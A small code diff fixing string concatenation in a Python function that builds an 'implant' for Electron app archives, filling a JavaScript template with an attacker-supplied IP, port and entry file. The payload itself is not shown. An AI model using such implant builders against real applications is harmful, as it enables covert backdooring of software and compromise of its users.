@@ -24,17 +24,17 @@ def generateImplant(ip, port, asarDir):
     with open('implant.js', 'r') as file:
         default_implant = file.readlines()
 
+    implantCode = ""
 
-
-    for index, line in enumerate(default_implant):
+    for line in default_implant:
         if "PLACEHOLDERMAIN" in line:
-            implantCode.join(line.replace("PLACEHOLDERMAIN", getMainFunc(asarDir)))
+            implantCode += line.replace("PLACEHOLDERMAIN", f"'./{getMainFunc(asarDir)}'")
         elif "PLACEHOLDERHOST" in line:
-            implantCode.join(line.replace("PLACEHOLDERHOST", f"'{ip}'"))
+            implantCode += line.replace("PLACEHOLDERHOST", f"'{ip}'")
         elif "PLACEHOLDERPORT" in line:
-            implantCode.join(line.replace("PLACEHOLDERPORT", str(port)))
+            implantCode += line.replace("PLACEHOLDERPORT", str(port))
         else:
-            implantCode = ''.join(line)
+            implantCode += line
 
     return implantCode
 
